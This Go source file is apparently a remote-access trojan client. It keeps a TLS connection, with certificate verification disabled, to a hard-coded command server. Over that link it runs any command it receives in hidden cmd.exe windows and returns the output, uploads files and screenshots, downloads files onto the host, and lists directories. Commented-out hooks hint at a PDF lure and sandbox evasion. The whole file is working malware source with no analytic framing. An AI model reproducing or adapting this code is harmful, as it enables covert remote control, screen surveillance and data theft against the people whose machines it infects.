package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

const caCert = `-----BEGIN CERTIFICATE-----
MIIDeDCCAmCgAwIBAgIJAL9w9+gbE7AMMA0GCSqGSIb3DQEBCwUAMGAxCzAJBgNV
BAYTAkNOMQ0wCwYDVQQIDARUZXN0MQ0wCwYDVQQHDARUZXN0MQ0wCwYDVQQKDARU
ZXN0MQ0wCwYDVQQLDARUZXN0MRUwEwYDVQQDDAwxOTIuMTY4LjEwLjEwHhcNMjUw
MzIxMDYzNjAwWhcNMjYwMzIxMDYzNjAwWjBgMQswCQYDVQQGEwJDTjENMAsGA1UE
CAwEVGVzdDENMAsGA1UEBwwEVGVzdDENMAsGA1UECgwEVGVzdDENMAsGA1UECwwE
VGVzdDEVMBMGA1UEAwwMMTkyLjE2OC4xMC4xMIIBIjANBgkqhkiG9w0BAQEFAAOC
AQ8AMIIBCgKCAQEA43BVLXeOBg1zoTXMNBsWsP51omYaTBlbdmNsqD9+jBGcr+9W
Bq4Gvt1j9cxSZGr00nwbvqI/u3Wisdu1zjK6NeIHiNBx4bGaLxZvn6fChA4jGUy0
mMrHmlP2qDpb30OMPZHRscN5PliAmsYq60Wz6zQuGfUw8rNmqQ6oggpq0pMrmTZM
aH5AxlPdc1Mq21z19A9AG9HmXb/LE7cHohgaOopMfM9AX5nU0wE4mISUuPsD6OF8
wNnjwrR9VLjYInG6dbdVWFtL6U3il4DwOuPOwghHUsIVSzScJDKxtF17VK0rqLV9
TAMdy2dOQDrSAnmi/ncW1CtWN430mW+i1US7wQIDAQABozUwMzALBgNVHQ8EBAMC
BDAwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDwYDVR0RBAgwBocEwKgKATANBgkqhkiG
9w0BAQsFAAOCAQEATHNYz5obVqedp2U8QwSeS/EQ0WEWmdYgSc2lNNN4SHh+q1ph
akkL3/iLF+9dReNDX3QIfj7s8Mw/BRA5HNtMyOin9vmdD9C2bgYGRddmzmsw39h8
DHU6dhg0dKI/ZMqRbWVTy548Qpu+5Z0goEFHeqypiGSnZFv/KosqsJ//eZpT7KoT
qyYhsy9hHgO7z98CuQrnZIqJCd52Vp08mTwxCG50N/nHOF8xgirQIpRYikHqMADd
SyVYP5u6eQisMInnHp6D3WPU0lMGVLMCdQGpEkZc8Vx4hd2i5WdBe5nvlmNz9bzQ
t6g1JqIYFkXY8KEdpe61B8VamV7T7c110WL+bw==
-----END CERTIFICATE-----
`

func main() {
	// go OpenEmbeddedPDF()
	// sandBoxMain()
	serverIP := "192.168.10.1:50050"

	for {
		conn, err := connectToServer(serverIP)
		if err != nil {
			log.Printf("Failed to connect to server: %v. Retrying in 60 seconds...", err)
			time.Sleep(60 * time.Second)
			continue
		}

		fmt.Println("Connected to server:", serverIP)
		handleServerCommands(conn)
		log.Println("Connection lost. Reconnecting in 60 seconds...")
		time.Sleep(60 * time.Second)
	}
}

func connectToServer(serverIP string) (net.Conn, error) {
	return initTLSConnection(serverIP, caCert)
}

func initTLSConnection(serverIP, caCert string) (net.Conn, error) {
	certPool := x509.NewCertPool()
	if !certPool.AppendCertsFromPEM([]byte(caCert)) {
		return nil, fmt.Errorf("加载公钥失败")
	}

	config := &tls.Config{
		RootCAs:            certPool,
		InsecureSkipVerify: true, // 开启不验证证书
	}

	conn, err := tls.Dial("tcp", serverIP, config)
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func handleServerCommands(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)

	for {
		cmd, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("Error reading command from server: %v. Connection will be retried.", err)
			return // 退出函数以触发重新连接
		}
		cmd = strings.TrimSpace(cmd)

		switch cmd {
		case "SEND_FILE_TO_SERVER":
			log.Println("开始发送文件到服务端...")
			sendFileToServer("./results/results.zip", conn)
		case "FILE_TRANSFER_TO_CLI_START":
			getFileForService(conn)
		case "captureScreenshottoserver":
			log.Println("开始截图并上传到服务端...")
			captureAndSendScreenshot(conn)
		case "LIST_FILES":
			log.Println("开始列出文件...")
			sendFileListToServer(conn)
		default:
			executeCommand(cmd, conn)
		}
	}
}

func executeCommand(cmd string, conn net.Conn) {
	command := exec.Command("cmd", "/c", cmd)
	command.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	output, err := command.CombinedOutput()
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("Error executing command: %s\n", err)))
	} else {
		output = convertGBKToUTF8(output)
		conn.Write(output)
	}
}

func convertGBKToUTF8(input []byte) []byte {
	decoder := simplifiedchinese.GBK.NewDecoder()
	utf8Reader := transform.NewReader(strings.NewReader(string(input)), decoder)
	utf8Output, err := ioutil.ReadAll(utf8Reader)
	if err != nil {
		return input
	}
	return utf8Output
}

func sendFileToServer(filePath string, conn net.Conn) {
	fileContent, err := ioutil.ReadFile(filePath)
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("Error reading file: %v\n", err)))
		return
	}
	fileName := "results.zip"
	fileSize := len(fileContent)
	conn.Write([]byte("FILE_TRANSFER_TO_SER_START\n"))
	conn.Write([]byte(fileName + "\n"))
	conn.Write([]byte(fmt.Sprintf("%d\n", fileSize)))
	conn.Write(fileContent)
}

func getFileForService(conn net.Conn) {
	log.Println("开始接收文件传输...")
	reader := bufio.NewReader(conn)

	fileName, err := reader.ReadString('\n')
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("Error reading file name: %v\n", err)))
		return
	}
	fileName = strings.TrimSpace(fileName)

	fileSizeStr, err := reader.ReadString('\n')
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("Error reading file size: %v\n", err)))
		return
	}
	fileSizeStr = strings.TrimSpace(fileSizeStr)

	fileSize, err := strconv.Atoi(fileSizeStr)
	if err != nil || fileSize <= 0 {
		log.Printf("Invalid file size: %v\n", err)
		conn.Write([]byte(fmt.Sprintf("Invalid file size: %v\n", err)))
		return
	}

	fileContent := make([]byte, fileSize)
	_, err = io.ReadFull(reader, fileContent)
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("Error reading file content: %v\n", err)))
		return
	}

	err = ioutil.WriteFile(fileName, fileContent, 0644)
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("Error saving file: %v\n", err)))
	} else {
		conn.Write([]byte(fmt.Sprintf("File saved as: %s\n", fileName)))
	}
}

func captureAndSendScreenshot(conn net.Conn) {
	screenshotPath := "./screenshot.png"

	// 截取主屏幕
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("Error capturing screenshot: %v\n", err)))
		return
	}

	// 保存截图
	file, err := os.Create(screenshotPath)
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("Error saving screenshot: %v\n", err)))
		return
	}
	defer file.Close()
	png.Encode(file, img)

	// 上传截图到服务端
	sendFileToServer(screenshotPath, conn)

	// 删除截图文件
	err = os.Remove(screenshotPath)
	if err != nil {
		log.Printf("Error deleting screenshot: %v\n", err)
		conn.Write([]byte(fmt.Sprintf("Error deleting screenshot: %v\n", err)))
	} else {
		log.Println("截图已成功上传并删除。")
	}
}

func sendFileListToServer(conn net.Conn) {
	dir := "./" // 指定目录
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("Error reading directory: %v\n", err)))
		return
	}

	conn.Write([]byte("FILE_LIST_START\n"))
	for _, file := range files {
		conn.Write([]byte(file.Name() + "\n"))
	}
	conn.Write([]byte("FILE_LIST_END\n"))
}
